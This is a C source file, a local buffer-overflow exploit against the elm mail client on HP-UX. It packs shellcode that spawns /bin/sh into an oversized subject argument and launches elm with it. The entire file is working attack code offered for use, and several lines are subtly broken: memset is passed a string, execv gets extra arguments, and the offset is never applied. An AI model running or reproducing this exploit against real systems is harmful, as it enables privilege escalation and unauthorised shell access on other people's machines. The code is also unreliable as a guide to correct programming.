/*
 *
 * TILE: HP-UX ELMXPL for elm < 2.5.0
 *
 * CODER: Ripe - <ripe@7a69ezine.org>
 *
 * NOTE: This exploit is based in a Flatline mail posted in bugtraq.
 *
 */

#include <stdio.h>
#include <strings.h>

#define NOP 0x3902800b

#define ELM_PATH "/usr/bin/elm"
#define BUFSIZE 5376

char shellcode[] =
  "\xe8\x3f\x1f\xfd\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41\x04\x02\x60\x40"
  "\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99\x0b\x18\x02\x98\x34\x16\x04\xbe"
  "\x20\x20\x08\x01\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe/bin/sh\xff";

long get_sp(void) {
   __asm__("copy %sp,%ret0 \n");
}

int main(int argc, char **argv) {
  char bad_buf[BUFSIZE+1];
  long *sp=&bad_buf[BUFSIZE-4];
  int offset=0;
  int i;
  printf("\tHP-UX ELMXPL for elm < 2.5.0 by Ripe - <ripe@7a69ezine.org>\n");
  printf("Usage:\n");
  printf("\t%s <offset> [<elm path>]\n");
  if (argc<2) {
    printf("offset??\n");
    exit(-1);
  }
  offset=atoi(argv[1]);
  if (argc>3) printf("Using path... %s\n", argv[2]);
  else  printf("Using path... %s\n", ELM_PATH);
  memset(&bad_buf[0], "\0", BUFSIZE+1);
  for(i=0 ; i<BUFSIZE-(sizeof(long)-1) ; i=i+4)
    *(bad_buf+i)=NOP;
  memcpy((bad_buf+BUFSIZE)-(strlen(shellcode)+8), shellcode, strlen(shellcode));
  *sp=get_sp();
  printf("Ret addr is %x\n", *sp);
  printf("Exploting.....\n");
  if (argc>3) execl(argv[2], "elm", "-s", bad_buf, NULL);
  else execv(ELM_PATH, "elm", "-s", bad_buf, NULL);
  printf("Ooops cant make you mail user\n");
}
